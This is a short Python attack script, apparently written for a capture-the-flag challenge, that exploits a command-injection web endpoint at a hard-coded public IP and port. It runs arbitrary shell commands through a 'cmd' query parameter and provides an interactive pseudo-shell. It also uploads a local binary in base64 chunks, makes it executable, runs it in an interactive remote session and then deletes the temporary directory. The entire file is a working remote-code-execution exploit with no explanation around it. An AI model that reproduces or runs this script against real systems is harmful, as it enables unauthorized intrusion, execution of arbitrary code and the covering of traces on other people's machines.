#!/usr/bin/env python3
import requests
import readline
from pwn import *

host = "3.93.128.89" #"0.0.0.0"#
port = 1224

url = "http://{}:{}/".format(host,port)

def run(cmd, redir_stderr=False):
	if redir_stderr:
		cmd += " 2>&1"
	params = {"cmd":cmd}
	r = requests.get(url,params=params)
	return r.text

def fake_shell():
	while True:
		cmd = input("> ").strip()
		if cmd == "exit":
			return
		print(run(cmd,redir_stderr=True))

def real_shell(executor):
	r = remote(host,port)
	request = "GET /?cmd={} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: curl/7.66.0\r\nAccept: */*\r\n\r\n"
	r.send(request.format(executor,host,port))
	r.interactive()

def upload_file(ipath, opath):
	with open(ipath,'rb') as f:
		data = f.read()
	chunks = group(1024, data)
	for chunk in chunks:
		chunk = b64e(chunk)
		run("echo {} |base64 -d >> {}".format(chunk,opath))

# fake_shell()
tmp_dir = run("mktemp -d").strip()
print(tmp_dir)
tmp_file = tmp_dir+"/a.out"
upload_file("./a.out",tmp_file)
run("chmod +x {}".format(tmp_file))
real_shell(tmp_file)
run("rm -rf {}".format(tmp_dir))
#fake_shell()